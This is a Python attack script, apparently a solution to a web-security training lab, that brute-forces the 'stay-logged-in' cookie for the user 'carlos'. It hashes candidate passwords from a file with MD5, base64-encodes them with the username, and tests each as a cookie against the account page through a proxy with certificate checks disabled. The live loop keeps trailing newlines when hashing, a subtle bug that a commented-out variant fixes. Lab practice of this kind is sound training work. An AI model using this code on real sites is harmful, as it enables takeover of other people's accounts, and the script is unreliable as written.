import requests
import sys
import urllib3
import base64
import hashlib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}
def access_carlos_acc(s,url):
    print("########Trying to access the carlos account#######")
    with open('lab_09_passwd.txt','r') as file:
        #password wala file khulyo now I will put this in some temporary file
        read_from_file=file.readlines()
        for read in read_from_file:
            passwd_md5= 'carlos:' + hashlib.md5(read.encode("utf-8")).hexdigest()
            base64_encode=base64.b64encode(bytes(passwd_md5,"utf-8"))
            str_passwd=base64_encode.decode("utf-8")
            # we now perfomr a request hai ta
            my_account=url + '/my-account?id=carlos'
            cookies={'stay-logged-in': str_passwd}
            # pefromt a get request
            r=requests.get(my_account,cookies=cookies,verify=False,proxies=proxies)
            if "Log out" in r.text:
                print("Successfully access the carlos account", str_passwd)
               
            else:
                print("Cannnot access the carlos account")
                   
                
       
        # for pwd in file:
        #     passwd_md5='carlos:' + hashlib.md5(pwd.rstrip('\r\n').encode("utf-8")).hexdigest()
        #     base64_encoded=base64.b64encode(bytes(passwd_md5,"utf-8"))
        #     str_passwd=base64_encoded.decode("utf-8")
            
        #     # la password ko kaam sakiyo hai ta mero 
        #     # now perform a request hai ta 
        #     my_account=url+ '/my-account?id=carlos'
        #     cookies={'stay-logged-in':str_passwd}
        #     #perform a get request
        #     r=requests.get(my_account,cookies=cookies,proxies=proxies,verify=False)
        #     res=r.text
        #     #print(res)
        #     if "Log out" in res:
        #         print("Successfully access the carlos account page")
        #     else:
        #         print("Cannot access the carlos accout")
        #         sys.exit(-1)
            
def main():
    if len(sys.argv) != 2:
        print("Usage %s  <url>", sys.argv[0])
        print("Example %s  www.example.com", sys.argv[0])
    else:
        s=requests.Session()
        url=sys.argv[1]
        access_carlos_acc(s,url)    

if __name__=="__main__":
    main()
